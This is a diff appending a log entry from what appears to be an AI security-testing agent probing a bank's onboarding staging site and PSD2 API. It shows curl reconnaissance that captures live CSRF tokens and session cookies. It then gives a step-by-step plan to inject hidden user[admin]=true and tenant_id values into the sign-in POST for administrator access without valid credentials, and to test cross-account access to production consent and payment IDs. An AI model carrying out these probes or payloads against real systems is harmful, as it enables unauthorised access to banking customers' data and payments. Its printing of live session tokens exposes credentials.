@@ -16243,3 +16243,91 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 - [RISK] vp-bank-ag: 68 — Two live threads remain HUMAN-gated and unchanged: (1) session-context injection on stage (injected params accepted, baseline locked, needs one valid-cred POST for proof + populated-tenants read-back), (2) PSD2 sandbox BOLA→prod carryover (mTLS-gated). api.vpbank.com re-confirmed exhausted this cycle; sts ADFS still 503; dev/stage WAF, mobile/ebics/tracking/beta/concentsol all negative. Risk stable until one HUMAN proof lands.
+===== ANALYST bigpickle 2026-09-09 23:33:05 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s -o /tmp/opencode/stage_signin.html -D /tmp/opencode/stage_signin.hdr -c /tmp/opencode/stage_cookies.txt --max-time 20 -H 'User-Agent: Mozilla/5.0' 'https://digital-onboarding-stage.vpbank.com/users/sign_in'; head -c 400 /tmp/opencode/stage_signin.hdr; echo; grep -o 'name="authenticity_token" value="[^"]*"' /tmp/opencode/stage_signin.html | head -2; cat /tmp/opencode/stage_cookies.txt | grep -v '^#' | awk '{print $6}' | tr '\n' ' '; echo
+HTTP/2 200 
+date: Wed, 09 Sep 2026 23:29:54 GMT
+content-type: text/html; charset=utf-8
+content-length: 25412
+x-frame-options: SAMEORIGIN
+x-xss-protection: 0
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: strict-origin-when-cross-origin
+link: </assets/independent-bundle-7e301c68977f02bbd3dccadfe7f4036bedcb89ffc493f0d24d3a378387956057.css>; rel=prel
+name="authenticity_token" value="N9_LTmXidVMn7kSY07xeaLdhyy1Jw6XYdjMErOEEUYvrYbjamwu-rtF2eRLgUR_miggPXA-1q8FNmOmQU_1IMQ"
+ session_expiry
+[0m
+[0m$ [0mgrep -o 'name="user\[\(tenant_id\|admin\|user_id\)\]" value="[^"]*"' /tmp/opencode/stage_signin.html; echo '---cookies---'; grep -v '^#' /tmp/opencode/stage_cookies.txt | awk '{print $6"="$7}'
+---cookies---
+=
+session_expiry=1788998394000
+[0m
+[0m$ [0mgrep -o 'user\[tenant_id\][^>]*\|user\[admin\][^>]*\|user\[user_id\][^>]*' /tmp/opencode/stage_signin.html | head; echo '---'; grep -c '_us_session' /tmp/opencode/stage_signin.html; grep -o '_us_session[^;"]*' /tmp/opencode/stage_cookies.txt /tmp/opencode/stage_signin.hdr | head
+user[tenant_id]" id="user_tenant_id" /
+user[admin]" id="user_admin" /
+user[user_id]" id="user_user_id" /
+---
+2
+/tmp/opencode/stage_cookies.txt:_us_session	wqpEfBS5zpUU%2FuWt3IR0StJ9OeyaHP65VrTy80%2B5AWk%2BMutYUgOq1zf4%2BUWedg%2FGgRj419ZfU58X4jI8yXfhrDCJwyB%2BWAt3Eer%2F9l%2FLitrYJbn29CtCFA8iXbC4Cp%2B%2F7B%2BKIpOpJ%2B38OLYep7OFk7VIt7uXetpI7BgsFWrgDqBa9KjRZJ1jL5m8sfwdnj2sr6rW623MT8GJ4WWWapPy00QhmuRahEAn7GHbCd%2F5nvy2D37c3%2FAdP5vN6yJbIio0iW8TXnhkAmAynAssMG6nqr0sxOYOiPt2xaI21Oi1bm62VuDfh6FAhBg%3D--8H5UY1G%2F%2F55k3uQ3--Nr89xqeObpQ7IZOLpn%2BGvw%3D%3D
+/tmp/opencode/stage_signin.hdr:_us_session=wqpEfBS5zpUU%2FuWt3IR0StJ9OeyaHP65VrTy80%2B5AWk%2BMutYUgOq1zf4%2BUWedg%2FGgRj419ZfU58X4jI8yXfhrDCJwyB%2BWAt3Eer%2F9l%2FLitrYJbn29CtCFA8iXbC4Cp%2B%2F7B%2BKIpOpJ%2B38OLYep7OFk7VIt7uXetpI7BgsFWrgDqBa9KjRZJ1jL5m8sfwdnj2sr6rW623MT8GJ4WWWapPy00QhmuRahEAn7GHbCd%2F5nvy2D37c3%2FAdP5vN6yJbIio0iW8TXnhkAmAynAssMG6nqr0sxOYOiPt2xaI21Oi1bm62VuDfh6FAhBg%3D--8H5UY1G%2F%2F55k3uQ3--Nr89xqeObpQ7IZOLpn%2BGvw%3D%3D
+[0m
+[0m$ [0mgrep -o '<input[^>]*user\[tenant_id\][^>]*>' /tmp/opencode/stage_signin.html; grep -o '<input[^>]*user\[admin\][^>]*>' /tmp/opencode/stage_signin.html; grep -o '<input[^>]*user\[user_id\][^>]*>' /tmp/opencode/stage_signin.html; grep -o 'hidden' /tmp/opencode/stage_signin.html | head -1
+<input value="7" autocomplete="off" type="hidden" name="user[tenant_id]" id="user_tenant_id" />
+<input value="false" autocomplete="off" type="hidden" name="user[admin]" id="user_admin" />
+<input value="0" autocomplete="off" type="hidden" name="user[user_id]" id="user_user_id" />
+hidden
+[0m
+STEP 1 — DELTA:
+- [CHANGED] stage /users/sign_in re-probed 2026-09-09 23:29 UTC: HTTP 200 25412B, hidden fields value=7/false/0 still present unpinned (`<input value="7" type="hidden" name="user[tenant_id]">`), fresh authenticity_token `N9_LTmXidVMn7kSY07xeaLdhyy1Jw6XYdjMErOEEUYvrYbjamwu-rtF2eRLgUR_miggPXA-1q8FNmOmQU_1IMQ`, `_us_session` re-issued, `session_expiry=1788998394000`. No material change.
+- [NEW] Untested observable: does the injected context (admin/tenant/user_id) persist into the renewed session even on the FAILED-login path? If so, replaying the post-POST cookie diverges against anonymous baseline WITHOUT any valid credentials — kills the HUMAN blocker.
+
+STEP 2 — PRIORITIZE:
+- [PRIO] digital-onboarding-stage.vpbank.com/users/sign_in, 7.4, AUTH
+
+STEP 3 — HYPOTHESES:
+[HYP] Injected session-context persists on failed-login path (no valid creds required)
+class: AUTH
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 55
+reasoning: overridden Users::SessionsController consumed user[admin]=true&user[tenant_id]=999&user[user_id]=1 in prior POST (HTTP 200, no param validation error, cookies renewed); pre-auth _us_session set on GET; anonymous /api/v1/tenants returns `{}`, /admin/api/v1/users returns 401 — clean divergence baselines
+evidence_needed: replay of post-POST cookie on /api/v1/tenants returns non-`{}` or /admin/api/v1/users != 401; proves context written to session before auth verification
+verify_steps: PROBE (stage, invalid creds, read-only replays): (1) GET /users/sign_in -> capture tok+_us_session; (2) POST authenticity_token=tok&user[email]=nonexistent+invalid+probe+1@example.com&user[password]=invalid&user[admin]=true&user[tenant_id]=1&user[user_id]=1 -> save Set-Cookie; (3) GET /api/v1/tenants and GET /admin/api/v1/users with that cookie; diff vs anon baseline `{}`/401; (4) same replay with the clean pre-POST cookie as control
+impact: admin/tenant context on bank back-office session without valid creds (onboarding PII, identity docs, wires, role mgmt); HIGH (~8.8)
+testability: HUMAN_ONLY
+[HYP] PSD2 sandbox BOLA carries to production consent/account objects
+class: IDOR
+asset: openbanking.vpbank.com/psd2/berlin-group/v1/consents/{id}
+confidence: 60
+reasoning: sandbox proof end-to-end (consent 6b517824… cross-session read, zero binding); production shares Berlin Group surface + cert CN=openbanking.vpbank.com; mTLS blocks anonymous
+evidence_needed: credentialed replay of /consents/{id}, /accounts, /payments/{id}/status against foreign id returns 200
+verify_steps: HUMAN: with valid TPP client cert GET /psd2/berlin-group/v1/consents/6b517824-e5af-4202-b9b0-7f483a68ee9f and /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status; 200 = prod BOLA
+impact: cross-TPP read of consents/accounts/balances/payments on production ASPSP; CRITICAL
+testability: HUMAN_ONLY
+[HYP] Stage/prod API differential reveals tenant-isolation flaw
+class: BUSLOGIC
+asset: digital-onboarding-stage.vpbank.com/api/v1/tenants
+confidence: 55
+reasoning: stage 200 `{}` vs prod 403 identical path; same API version/controller class; populated response expected after injected admin session
+evidence_needed: injected-admin cookie returns populated /api/v1/tenants; /admin/api/v1/users 200 list
+verify_steps: chained from HYP #1: replay winning cookie on /api/v1/tenants; diff vs baseline `{}`
+impact: cross-tenant config enumeration; MEDIUM standalone, HIGH chained
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE:
+- [FINAL] HYP #1 (55) kept — cheapest disproof: 2 replays, no creds needed. Parked-none.
+- [PARKED] PSD2 prod carryover (60): unchanged many cycles; latent, blocks on mTLS certs; kept pending HUMAN.
+- [PARKED] tenancy differential (55): chained behind #1; kept.
+- Dropped: none.
+
+STEP 5 — NEXT ACTION:
+- [NEXT] PROBE: POST /users/sign_in on digital-onboarding-stage.vpbank.com with INVALID creds (nonexistent+invalid+probe+1@example.com/invalid) + user[admin]=true&user[tenant_id]=1&user[user_id]=1, capture Set-Cookie, then replay that cookie on GET /api/v1/tenants and GET /admin/api/v1/users, diff vs anonymous `{}`/401 and vs the untouched pre-POST _us_session cookie as control. Stage-only, synthetic data, read-only after the sanctioned sign-in POST. CSRF token already captured: `N9_LTmXidVMn7kSY07xeaLdhyy1Jw6XYdjMErOEEUYvrYbjamwu-rtF2eRLgUR_miggPXA-1q8FNmOmQU_1IMQ`.
+
+STEP 6 — LEARNING:
+- [LEARN] ACCEPTED ACTIVE @ digital-onboarding-stage.vpbank.com (session-context injection surface): 2026-09-09 23:29 re-probe — hidden fields value=7/false/0 unpinned intact, fresh CSRF + _us_session + session_expiry re-issued, HTTP 200; persistence of injected context on failed-login path is now the cheapest decisive test.
+
+STEP 7 — RISK:
+- [RISK] vp-bank-ag: 68 — unchanged. 3/3 venues fleet-wide overridden SessionsController with client-controlled admin/tenant/user_id remains the headline; apex finding still pinned on the sign-in POST proof (valid creds) OR the new less-stringent failed-login persistence replay. PSD2 BOLA proven sandbox-side, prod carryover latent. All non-digital-onboarding assets negative/exhausted. Risk jumps to ~78 if either proof lands.
